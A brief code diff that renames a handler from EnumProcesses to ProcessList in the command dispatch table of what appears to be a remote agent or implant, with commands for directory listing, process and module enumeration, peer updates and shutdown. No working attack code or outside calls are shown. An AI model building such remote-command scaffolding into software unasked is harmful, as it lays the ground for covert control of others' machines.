@@ -14,7 +14,7 @@ enum CommandType {
 namespace Commands {
 	FUNCTION VOID DirectoryList (PPARSER Parser);
 	FUNCTION VOID ProcessModules (PPARSER Parser);
-	FUNCTION VOID EnumProcesses (PPARSER Parser);
+	FUNCTION VOID ProcessList (PPARSER Parser);
     FUNCTION VOID Shutdown(PPARSER Parser);
 	FUNCTION VOID UpdatePeer(PPARSER Parser);
 }
@@ -22,7 +22,7 @@ namespace Commands {
 RDATA_SECTION COMMAND_MAP CmdMap[] = {
 	{ .Id = CommandDir,         .Function = Commands::DirectoryList },
 	{ .Id = CommandMods,        .Function = Commands::ProcessModules },
-	{ .Id = CommandProcess,     .Function = Commands::EnumProcesses },
+	{ .Id = CommandProcess,     .Function = Commands::ProcessList },
 	{ .Id = CommandUpdatePeer,  .Function = Commands::UpdatePeer },
 	{ .Id = CommandShutdown,    .Function = Commands::Shutdown },
 	{ .Id = 0,                  .Function = nullptr }
